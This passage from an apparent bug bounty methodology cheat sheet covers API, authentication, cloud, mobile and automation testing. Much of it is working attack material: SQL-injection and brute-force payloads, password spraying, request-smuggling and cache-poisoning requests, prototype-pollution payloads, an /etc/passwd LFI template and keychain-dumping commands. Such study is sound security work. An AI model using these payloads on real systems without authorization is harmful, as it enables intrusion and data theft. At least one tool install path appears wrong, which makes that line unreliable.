  -H "Content-Type: application/json" \\
  -d '{"query": "{__schema{queryType{name}mutationType{name}types{name,fields{name,args{name,type{name}}}}}}"}'

# GraphQL Voyager - Visual schema
# <https://graphql-kit.com/graphql-voyager/>

# InQL - Burp Extension for GraphQL

# graphql-cop - Security audit
graphql-cop -t <https://target.com/graphql>

# BatchQL - GraphQL security scanner
python3 batchql.py -e <https://target.com/graphql>

# graphw00f - GraphQL fingerprinting
python3 graphw00f.py -t <https://target.com/graphql>

# Clairvoyance - Obtain GraphQL schema
python3 clairvoyance.py <https://target.com/graphql> -o schema.json -w wordlist.txt

# GraphQL injection payloads
{"query": "{user(id: \\"1 OR 1=1\\"){name}}"}
{"query": "{user(id: \\"1' UNION SELECT * FROM users--\\"){name}}"}

# Batching attacks
[
  {"query": "mutation{login(user:\\"admin\\",pass:\\"pass1\\")}"},
  {"query": "mutation{login(user:\\"admin\\",pass:\\"pass2\\")}"},
  {"query": "mutation{login(user:\\"admin\\",pass:\\"pass3\\")}"}
]

```

## 8.3 REST API Testing

```bash
# HTTP Methods testing
curl -X GET <https://target.com/api/users>
curl -X POST <https://target.com/api/users> -d '{"name":"test"}'
curl -X PUT <https://target.com/api/users/1> -d '{"name":"updated"}'
curl -X PATCH <https://target.com/api/users/1> -d '{"name":"patched"}'
curl -X DELETE <https://target.com/api/users/1>
curl -X OPTIONS <https://target.com/api/users>

# API version testing
curl <https://target.com/api/v1/users>
curl <https://target.com/api/v2/users>
curl <https://target.com/api/v3/users>

# Content-Type variations
curl -X POST <https://target.com/api/login> \\
  -H "Content-Type: application/json" \\
  -d '{"user":"admin","pass":"test"}'

curl -X POST <https://target.com/api/login> \\
  -H "Content-Type: application/xml" \\
  -d '<login><user>admin</user><pass>test</pass></login>'

# IDOR testing
for i in {1..100}; do
  curl -s "<https://target.com/api/users/$i>" | jq '.email'
done

# Mass assignment
curl -X POST <https://target.com/api/users> \\
  -H "Content-Type: application/json" \\
  -d '{"name":"test","role":"admin","isAdmin":true}'

# API rate limiting test
for i in {1..1000}; do
  curl -s -o /dev/null -w "%{http_code}\\n" <https://target.com/api/endpoint>
done | sort | uniq -c

# JWT testing
# jwt_tool
python3 jwt_tool.py <JWT> -M at
python3 jwt_tool.py <JWT> -X a -k <key>
python3 jwt_tool.py <JWT> -T

# Check JWT algorithm confusion
# Change "alg" from RS256 to HS256

# JWT None algorithm
echo '{"alg":"none","typ":"JWT"}' | base64

```

---

# PHASE 9: AUTHENTICATION & AUTHORIZATION TESTING

## 9.1 Authentication Bypass

```bash
# Default credentials testing
hydra -L users.txt -P passwords.txt <https://target.com> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Password spraying
crackmapexec smb target.com -u users.txt -p 'Summer2025!'
spray.sh -smb target.com users.txt passwords.txt

# 2FA bypass techniques
# Code reuse
# Code manipulation (123456 -> 123457)
# Response manipulation
# Session fixation
# Backup code bypass

# Password reset vulnerabilities
# Token manipulation
# Host header injection
# Response manipulation
# Email parameter pollution

```

## 9.2 Authorization Testing (IDOR)

```bash
# IDOR testing
# Change user ID
GET /api/users/123 -> GET /api/users/124

# UUID enumeration
GET /api/users/550e8400-e29b-41d4-a716-446655440000

# Encoded ID manipulation
/api/users/MTIz -> /api/users/MTI0 (base64: 123 -> 124)

# Parameter pollution
GET /api/users?id=123&id=124

# HTTP Parameter pollution
GET /api/users?user_id=123&user_id=124

# Autorize (Burp Extension)
# Auth Analyzer (Burp Extension)

# Manual IDOR testing script
#!/bin/bash
for id in {1..1000}; do
  response=$(curl -s -H "Authorization: Bearer $TOKEN" "<https://target.com/api/users/$id>")
  echo "ID: $id - Response: $response"
done

# Horizontal privilege escalation
# Access other users' resources

# Vertical privilege escalation
# Access admin functionality as regular user

```

## 9.3 Session Management

```bash
# Session fixation testing
# Set session before login
# Check if session changes after login

# Session hijacking
# Capture session via XSS
# Session prediction

# Cookie analysis
# Check cookie flags: HttpOnly, Secure, SameSite
curl -I <https://target.com/login> -c cookies.txt

# JWT analysis
# jwt.io - Decode JWT
# Check algorithm
# Check expiration
# Test algorithm confusion

# Session token entropy
# Burp Sequencer analysis

```

---

# PHASE 10: ADVANCED EXPLOITATION TECHNIQUES

## 10.1 Race Conditions

```bash
# Race condition testing
# Turbo Intruder (Burp Extension)
# Use single-packet attack

# Python race condition script
import asyncio
import aiohttp

async def send_request(session, url):
    async with session.post(url) as response:
        return await response.text()

async def race_condition(url, count):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url) for _ in range(count)]
        return await asyncio.gather(*tasks)

asyncio.run(race_condition("<https://target.com/redeem>", 100))

# Race the Web
race-the-web config.toml

# Common race condition targets
# - Coupon/discount redemption
# - Money transfer
# - Vote manipulation
# - Follow/Like actions

```

## 10.2 HTTP Request Smuggling

```bash
# Smuggler - Detection tool
python3 smuggler.py -u <https://target.com>

# HTTP Request Smuggling payloads
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0

# TE.TE (obfuscation)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
 Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked

# defparam smuggler
python3 smuggler.py -u <https://target.com>

```

## 10.3 Cache Poisoning

```bash
# Web Cache Deception
<https://target.com/account/settings/non-existent.css>
<https://target.com/api/user/profile.js>

# Cache poisoning via headers
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Param Miner (Burp Extension) for cache poisoning discovery

# Cache key manipulation
<https://target.com/page?cachebuster=random123>

# Web Cache Poisoning detection
# Check response headers: X-Cache, Age, Cache-Control
curl -I <https://target.com> | grep -i cache

```

## 10.4 Prototype Pollution

```bash
# Client-side prototype pollution
# Payload
<https://target.com/?__proto__[test]=polluted>
<https://target.com/?constructor[prototype][test]=polluted>
<https://target.com/#__proto__[test]=polluted>

# Server-side prototype pollution (Node.js)
{
  "__proto__": {
    "isAdmin": true
  }
}

{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}

# Detection
# PPScan
ppmap -u "<https://target.com/?__proto__[test]=test>"

```

## 10.5 WebSocket Attacks

```bash
# WebSocket testing
# OWASP ZAP WebSocket testing
# Burp Suite WebSocket History

# wscat - WebSocket client
wscat -c wss://target.com/socket

# websocat
websocat wss://target.com/socket

# Cross-Site WebSocket Hijacking
# Check Origin header validation
# Test CSWSH with malicious page

# WebSocket message manipulation
# IDOR via WebSocket
# XSS via WebSocket
# SQLi via WebSocket

```

## 10.6 DOM-based Vulnerabilities

```bash
# DOM XSS sources
location.hash
location.search
location.href
document.URL
document.documentURI
document.referrer
window.name
localStorage
sessionStorage
IndexedDB
postMessage

# DOM XSS sinks
eval()
setTimeout()
setInterval()
Function()
innerHTML
outerHTML
document.write()
document.writeln()

# DOM Clobbering
<form id="x"><input id="y"></form>
<script>alert(x.y)</script>

# DOM Invader (Burp Extension)
# Automated DOM vulnerability detection

# Retire.js integration
retire --js --jspath ./js/

```

---

# PHASE 11: CLOUD SECURITY TESTING

## 11.1 AWS Security Testing

```bash
# AWS CLI enumeration
aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# S3 bucket enumeration
# S3Scanner
python3 s3scanner.py sites.txt

# Bucket Finder
bucket_finder wordlist.txt

# AWSBucketDump
python3 AWSBucketDump.py -l buckets.txt -D output/

# Cloud_enum
python3 cloud_enum.py -k target

# Pacu - AWS exploitation framework
python3 pacu.py
> import_keys
> run iam__enum_permissions
> run s3__bucket_finder
> run lambda__enum
> run ec2__enum

# ScoutSuite
scout aws --profile default

# Prowler
./prowler -M csv -M html

# CloudMapper
python3 cloudmapper.py collect --account myaccount
python3 cloudmapper.py report --account myaccount

# S3 bucket permissions
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Cognito testing
aws cognito-idp list-user-pools --max-results 10

```

## 11.2 Azure Security Testing

```bash
# Azure CLI
az login
az account list
az storage account list
az webapp list
az keyvault list

# Azure blob enumeration
# MicroBurst
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target

# BlobHunter
python3 blobhunter.py -n targetcompany

# ScoutSuite for Azure
scout azure --user-account

# Azure AD enumeration
# ROADtools
roadrecon auth --access-token TOKEN
roadrecon gather
roadrecon gui

```

## 11.3 GCP Security Testing

```bash
# GCP CLI
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud storage ls

# GCP bucket enumeration
gcpbucketbrute -k target -p projects.txt

# ScoutSuite for GCP
scout gcp --user-account

# GCP Firestore/Firebase testing
python3 firebase_scanner.py -p project-id

```

---

# PHASE 12: MOBILE APPLICATION TESTING

## 12.1 Android Testing

```bash
# APK extraction
adb pull /data/app/com.target.app-1/base.apk target.apk

# APK decompilation
# apktool
apktool d target.apk -o decompiled/

# jadx
jadx target.apk -d jadx_output/

# dex2jar
d2j-dex2jar target.apk
# Then use JD-GUI to view JAR

# MobSF - Mobile Security Framework
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Frida - Dynamic instrumentation
frida -U -l script.js com.target.app

# Objection - Frida wrapper
objection -g com.target.app explore
# objection commands
> android sslpinning disable
> android root disable
> android hooking list activities
> android hooking list classes
> android hooking watch class com.target.app.MainActivity

# APK signature bypass
apksigner sign --ks keystore.jks --out signed.apk unsigned.apk

# Drozer
drozer console connect
dz> run app.package.list -f target
dz> run app.package.info -a com.target.app
dz> run app.package.attacksurface com.target.app
dz> run app.activity.info -a com.target.app
dz> run scanner.provider.injection -a com.target.app

# Nuclei Android templates
nuclei -l android_endpoints.txt -t ~/nuclei-templates/mobile/

```

## 12.2 iOS Testing

```bash
# iOS app extraction
# ipatool
ipatool auth login
ipatool download -b com.target.app -o app.ipa

# IPA analysis
unzip app.ipa -d extracted/

# class-dump
class-dump -H Payload/App.app/App -o headers/

# Frida for iOS
frida -U -l script.js com.target.app

# Objection for iOS
objection -g com.target.app explore
> ios sslpinning disable
> ios keychain dump
> ios nsuserdefaults get

# Cycript
cycript -p PID
cy# [NSApp windows]

# Needle (iOS Security Framework)
./needle
> use binary/info
> set APP com.target.app
> run

```

---

# PHASE 13: AUTOMATION & WORKFLOWS

## 13.1 Complete Automation Pipeline

```bash
#!/bin/bash
# complete_recon.sh

TARGET=$1
OUTPUT="output/$TARGET"
mkdir -p $OUTPUT

echo "[*] Starting comprehensive recon for $TARGET"

# Subdomain enumeration
echo "[*] Subdomain enumeration..."
subfinder -d $TARGET -all -o $OUTPUT/subfinder.txt
amass enum -passive -d $TARGET -o $OUTPUT/amass.txt
cat $OUTPUT/*.txt | sort -u > $OUTPUT/all_subs.txt

# DNS resolution
echo "[*] Resolving subdomains..."
puredns resolve $OUTPUT/all_subs.txt -r resolvers.txt -w $OUTPUT/resolved.txt

# HTTP probing
echo "[*] HTTP probing..."
cat $OUTPUT/resolved.txt | httpx -silent -title -tech-detect -status-code -follow-redirects -json -o $OUTPUT/httpx.json
cat $OUTPUT/httpx.json | jq -r '.url' > $OUTPUT/live_urls.txt

# Port scanning
echo "[*] Port scanning..."
naabu -l $OUTPUT/resolved.txt -p - -silent -o $OUTPUT/ports.txt

# JavaScript extraction
echo "[*] Extracting JavaScript files..."
cat $OUTPUT/live_urls.txt | getJS --complete --output $OUTPUT/js_files.txt

# Content discovery
echo "[*] Content discovery..."
cat $OUTPUT/live_urls.txt | xargs -I{} feroxbuster -u {} -w wordlist.txt -t 50 -x php,asp,aspx,jsp -o $OUTPUT/ferox_{}.txt

# Vulnerability scanning
echo "[*] Vulnerability scanning..."
nuclei -l $OUTPUT/live_urls.txt -t ~/nuclei-templates/ -severity critical,high,medium -o $OUTPUT/nuclei_results.txt

echo "[*] Recon complete! Results in $OUTPUT"

```

## 13.2 Continuous Monitoring

```bash
#!/bin/bash
# monitor.sh - Continuous subdomain monitoring

TARGET=$1
PREVIOUS="data/${TARGET}_previous.txt"
CURRENT="data/${TARGET}_current.txt"
DIFF="data/${TARGET}_diff.txt"

# Get current subdomains
subfinder -d $TARGET -silent > $CURRENT

# Compare with previous
if [ -f "$PREVIOUS" ]; then
    comm -13 <(sort $PREVIOUS) <(sort $CURRENT) > $DIFF

    if [ -s "$DIFF" ]; then
        echo "[!] New subdomains found:"
        cat $DIFF

        # Alert via webhook
        curl -X POST -H "Content-Type: application/json" \\
            -d "{\\"text\\":\\"New subdomains for $TARGET: $(cat $DIFF | tr '\\n' ' ')\\"}" \\
            $SLACK_WEBHOOK

        # Immediate scan of new subdomains
        cat $DIFF | httpx -silent | nuclei -t ~/nuclei-templates/ -severity critical,high
    fi
fi

# Update previous
mv $CURRENT $PREVIOUS

```

## 13.3 Custom Nuclei Templates

```yaml
# custom-ssrf.yaml
id: custom-ssrf-detection

info:
  name: Custom SSRF Detection
  author: yourname
  severity: high
  tags: ssrf,oast

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/fetch?url={{interactsh-url}}"
      - "{{BaseURL}}/load?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy?url={{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"

```

```yaml
# custom-lfi.yaml
id: custom-lfi-detection

info:
  name: Custom LFI Detection
  author: yourname
  severity: high
  tags: lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page?file=../../../etc/passwd"
      - "{{BaseURL}}/include?path=....//....//....//etc/passwd"

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

```

## 13.4 Notify Configuration

```yaml
# notify-config.yaml
slack:
  - id: "slack"
    slack_channel: "bug-bounty"
    slack_username: "recon-bot"
    slack_format: "{{data}}"
    slack_webhook_url: "<https://hooks.slack.com/services/xxx>"

discord:
  - id: "discord"
    discord_channel: "bug-bounty"
    discord_username: "recon-bot"
    discord_webhook_url: "<https://discord.com/api/webhooks/xxx>"

telegram:
  - id: "telegram"
    telegram_api_key: "xxx"
    telegram_chat_id: "xxx"
    telegram_format: "{{data}}"

```

---

# PHASE 14: PROFESSIONAL REPORTING

## 14.1 Report Structure

```markdown
# Vulnerability Report

## Executive Summary
- Brief overview of findings
- Risk rating
- Business impact

## Vulnerability Details

### Title: [Vulnerability Name]

**Severity:** Critical/High/Medium/Low

**Affected URL/Endpoint:**
- <https://target.com/vulnerable/endpoint>

**Description:**
Clear explanation of the vulnerability and its impact.

**Steps to Reproduce:**
1. Navigate to <https://target.com>
2. Enter payload: `test' OR '1'='1`
3. Observe the response...

**Proof of Concept:**
[Screenshot/Video]

**Impact:**
- Data breach potential
- Account takeover
- Financial loss estimation

**Remediation:**
- Specific fix recommendations
- Code examples if applicable

**References:**
- OWASP: <https://owasp.org/>...
- CWE: <https://cwe.mitre.org/>...
- CVE (if applicable)

## Timeline
- Discovery Date: YYYY-MM-DD
- Report Date: YYYY-MM-DD
- Vendor Response: YYYY-MM-DD

```

## 14.2 CVSS Scoring

```
CVSS v3.1 Calculator
<https://www.first.org/cvss/calculator/3.1>

Attack Vector (AV): Network/Adjacent/Local/Physical
Attack Complexity (AC): Low/High
Privileges Required (PR): None/Low/High
User Interaction (UI): None/Required
Scope (S): Unchanged/Changed
Confidentiality (C): None/Low/High
Integrity (I): None/Low/High
Availability (A): None/Low/High

```

## 14.3 Best Practices

```markdown
## Reporting Best Practices

1. **Clear Title**
   - Bad: "SQL Injection"
   - Good: "SQL Injection in user search leads to full database access"

2. **Detailed Steps**
   - Every step should be reproducible
   - Include screenshots/videos
   - Provide exact payloads

3. **Impact Assessment**
   - Real-world impact
   - Business context
   - Data affected

4. **Professional Communication**
   - Be respectful
   - Be patient
   - Follow program rules

5. **Evidence**
   - Screenshots with timestamps
   - Video recordings
   - Request/Response logs

```

---

# ESSENTIAL TOOL INSTALLATION

```bash
# Go tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/tomnomnom/gau@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/ffuf@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/d3mondev/puredns/v2@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/ferreiraklet/airixss@latest
go install -v github.com/hahwul/dalfox/v2@latest

# Python tools
pip3 install sqlmap
pip3 install xsstrike
pip3 install arjun
pip3 install uro
pip3 install dnsgen
pip3 install theHarvester
pip3 install trufflehog
pip3 install h8mail

# Apt packages
sudo apt install nmap masscan nikto whatweb gobuster dirb dirbuster wfuzz amass

# Clone repositories
git clone <https://github.com/projectdiscovery/nuclei-templates.git> ~/nuclei-templates
git clone <https://github.com/danielmiessler/SecLists.git> ~/SecLists
git clone <https://github.com/swisskyrepo/PayloadsAllTheThings.git> ~/PayloadsAllTheThings

```

---

# RESOURCES & REFERENCES

## Learning Platforms

- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- PentesterLab
- OWASP WebGoat

## Wordlists

- SecLists: https://github.com/danielmiessler/SecLists
- FuzzDB: https://github.com/fuzzdb-project/fuzzdb
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

## Bug Bounty Platforms

- HackerOne
- Bugcrowd
- Intigriti
- YesWeHack
- Synack

---
